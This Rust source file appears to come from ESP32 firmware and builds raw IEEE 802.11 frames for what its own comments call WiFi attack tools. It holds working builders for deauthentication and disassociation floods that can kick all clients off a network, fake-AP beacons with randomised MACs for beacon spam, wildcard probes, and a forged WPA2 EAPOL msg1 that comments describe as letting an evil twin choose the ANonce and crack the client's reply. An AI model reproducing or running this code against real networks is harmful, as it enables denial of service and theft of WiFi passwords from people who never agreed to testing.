//! Raw IEEE 802.11 management-frame builders for the WiFi attack tools.
//!
//! Every builder writes the complete on-air frame into a caller-provided buffer
//! and returns the number of bytes used — no allocation, no hidden state. The
//! bytes are exactly what gets handed to `Sniffer::send_raw_frame`
//! (`esp_wifi_80211_tx`); the radio appends the FCS itself.
//!
//! Layout reference (management frame, no QoS / no HT):
//!   [0..2]  Frame Control (subtype in the high nibble of byte 0)
//!   [2..4]  Duration
//!   [4..10] Address 1 — receiver / destination
//!   [10..16]Address 2 — transmitter / source
//!   [16..22]Address 3 — BSSID
//!   [22..24]Sequence Control (left 0; the HW rewrites it when asked)
//!   ...     frame body
//!
//! These are deliberately tiny and dependency-free so they can be reasoned about
//! (and unit-checked) without a radio attached.

/// The all-stations broadcast address.
pub const BROADCAST: [u8; 6] = [0xFF; 6];

/// Default 802.11b/g supported-rates IE payload (8 rates, the `0x80` bit marks
/// the "basic" ones). Re-used by beacon and probe-request frames.
const RATES: [u8; 8] = [0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c];

/// A trivial forward-only cursor over a byte buffer. Silently clamps at the end
/// so a builder can never write out of bounds; callers size their buffers from
/// the `*_LEN`/`max_*_len` helpers below.
struct Cur<'a> {
    buf: &'a mut [u8],
    n: usize,
}
impl<'a> Cur<'a> {
    fn new(buf: &'a mut [u8]) -> Self {
        Self { buf, n: 0 }
    }
    #[inline]
    fn u8(&mut self, v: u8) {
        if self.n < self.buf.len() {
            self.buf[self.n] = v;
            self.n += 1;
        }
    }
    #[inline]
    fn bytes(&mut self, v: &[u8]) {
        for &b in v {
            self.u8(b);
        }
    }
    /// Tagged information element: [tag][len][payload..].
    #[inline]
    fn ie(&mut self, tag: u8, payload: &[u8]) {
        debug_assert!(payload.len() <= 255, "IE payload exceeds the 1-byte length field");
        self.u8(tag);
        self.u8(payload.len() as u8);
        self.bytes(payload);
    }
}

/// Common 24-byte management header. `subtype_byte` is the full first FC byte
/// (e.g. `0xC0` for deauth). Address2 == Address3 == `bssid` for AP-sourced frames.
fn header(c: &mut Cur, subtype_byte: u8, a1: [u8; 6], a2: [u8; 6], a3: [u8; 6]) {
    c.u8(subtype_byte);
    c.u8(0x00); // FC flags
    c.u8(0x00); // duration
    c.u8(0x00);
    c.bytes(&a1);
    c.bytes(&a2);
    c.bytes(&a3);
    c.u8(0x00); // sequence control
    c.u8(0x00);
}

/// Fixed length of a deauth/disassoc frame.
pub const DEAUTH_LEN: usize = 26;

/// Deauthentication frame (mgmt subtype 12 -> FC byte `0xC0`).
///
/// `dst` is the client being kicked (or [`BROADCAST`] to kick everyone on the
/// BSS); `bssid` is the AP. `reason` is an 802.11 reason code (7 = "class-3
/// frame from nonassociated STA", the classic deauth reason).
pub fn deauth(buf: &mut [u8], dst: [u8; 6], bssid: [u8; 6], reason: u16) -> usize {
    let mut c = Cur::new(buf);
    header(&mut c, 0xC0, dst, bssid, bssid);
    c.u8((reason & 0xFF) as u8);
    c.u8((reason >> 8) as u8);
    c.n
}

/// Disassociation frame (mgmt subtype 10 -> FC byte `0xA0`). Same shape as deauth.
pub fn disassoc(buf: &mut [u8], dst: [u8; 6], bssid: [u8; 6], reason: u16) -> usize {
    let mut c = Cur::new(buf);
    header(&mut c, 0xA0, dst, bssid, bssid);
    c.u8((reason & 0xFF) as u8);
    c.u8((reason >> 8) as u8);
    c.n
}

/// Worst-case beacon length for an SSID of `ssid_len` bytes — use this to size
/// the buffer. (header 24 + fixed 12 + SSID 2+len + rates 10 + DS 3).
pub const fn max_beacon_len(ssid_len: usize) -> usize {
    24 + 12 + (2 + ssid_len) + (2 + 8) + 3
}

/// Beacon frame announcing a (fake) AP `ssid` on `channel`, sourced from `bssid`.
/// `privacy` sets the capability bit so clients show it as encrypted.
pub fn beacon(buf: &mut [u8], bssid: [u8; 6], ssid: &[u8], channel: u8, privacy: bool) -> usize {
    let mut c = Cur::new(buf);
    header(&mut c, 0x80, BROADCAST, bssid, bssid);
    // fixed parameters
    c.bytes(&[0; 8]); // timestamp (HW fills)
    c.u8(0x64); // beacon interval = 100 TU
    c.u8(0x00);
    c.u8(if privacy { 0x11 } else { 0x01 }); // capability: ESS (+Privacy)
    c.u8(0x04);
    // tagged parameters
    c.ie(0x00, ssid); // SSID
    c.ie(0x01, &RATES); // supported rates
    c.ie(0x03, &[channel]); // DS parameter set (current channel)
    c.n
}

/// Worst-case probe-request length for an SSID of `ssid_len` bytes.
pub const fn max_probe_len(ssid_len: usize) -> usize {
    24 + (2 + ssid_len) + (2 + 8)
}

/// Probe-request frame from `src`. An empty `ssid` is a wildcard probe (asks
/// every AP in range to respond) — used to coax hidden networks into replying.
pub fn probe_req(buf: &mut [u8], src: [u8; 6], ssid: &[u8]) -> usize {
    let mut c = Cur::new(buf);
    header(&mut c, 0x40, BROADCAST, src, BROADCAST);
    c.ie(0x00, ssid);
    c.ie(0x01, &RATES);
    c.n
}

/// Length of the msg1 EAPOL-Key frame [`eapol_m1`] builds.
pub const EAPOL_M1_LEN: usize = 24 + 8 + 4 + 95;

/// Build a WPA2 4-way **msg1** EAPOL-Key frame (AP -> client) carrying `anonce`
/// and `replay`. This is a non-QoS EAPOL *data* frame — an ALLOWED `esp_wifi_80211_tx`
/// subtype (unlike deauth) — so the evil twin can inject an ANonce WE choose and
/// then crack the client's resulting msg2 (whose MIC is keyed to that ANonce).
pub fn eapol_m1(buf: &mut [u8], client: [u8; 6], ap: [u8; 6], anonce: &[u8; 32], replay: u64) -> usize {
    let mut c = Cur::new(buf);
    // 802.11 data header (FromDS): a1 = client (DA), a2 = ap (BSSID/SA), a3 = ap
    c.u8(0x08); // FC: type = data, subtype 0
    c.u8(0x02); // FC flags: FromDS
    c.u8(0x00);
    c.u8(0x00); // duration
    c.bytes(&client);
    c.bytes(&ap);
    c.bytes(&ap);
    c.u8(0x00);
    c.u8(0x00); // sequence control
    // LLC/SNAP + EAPOL ethertype
    c.bytes(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);
    // 802.1X header: version 2, type 3 (EAPOL-Key), body length 95 (no key data)
    c.u8(0x02);
    c.u8(0x03);
    c.u8(0x00);
    c.u8(95);
    // EAPOL-Key body (msg1: Pairwise + ACK, NO MIC). key info 0x008A = ver2|pairwise|ack.
    c.u8(0x02); // descriptor type RSN
    c.u8(0x00);
    c.u8(0x8a);
    c.u8(0x00);
    c.u8(0x10); // key length 16
    c.bytes(&replay.to_be_bytes()); // replay counter (8)
    c.bytes(anonce); // key nonce (32) = ANonce
    c.bytes(&[0u8; 16]); // key IV
    c.bytes(&[0u8; 8]); // key RSC
    c.bytes(&[0u8; 8]); // reserved
    c.bytes(&[0u8; 16]); // key MIC (none in msg1)
    c.u8(0x00);
    c.u8(0x00); // key data length 0
    c.n
}

/// Derive a locally-administered, unicast random-ish MAC from a 32-bit seed.
/// (LAA bit set, multicast bit cleared.) Used as the source address for spammed
/// beacons / probes so each fake AP looks like a distinct device.
pub fn fake_mac(seed: u32) -> [u8; 6] {
    let s = seed.wrapping_mul(2654435761); // Knuth multiplicative hash
    [
        (0x02 | (s as u8 & 0xFC)) & 0xFE, // locally administered, unicast
        (s >> 8) as u8,
        (s >> 16) as u8,
        (s >> 24) as u8,
        (s ^ 0xA5) as u8,
        (s.rotate_left(5) as u8) ^ 0x5A,
    ]
}
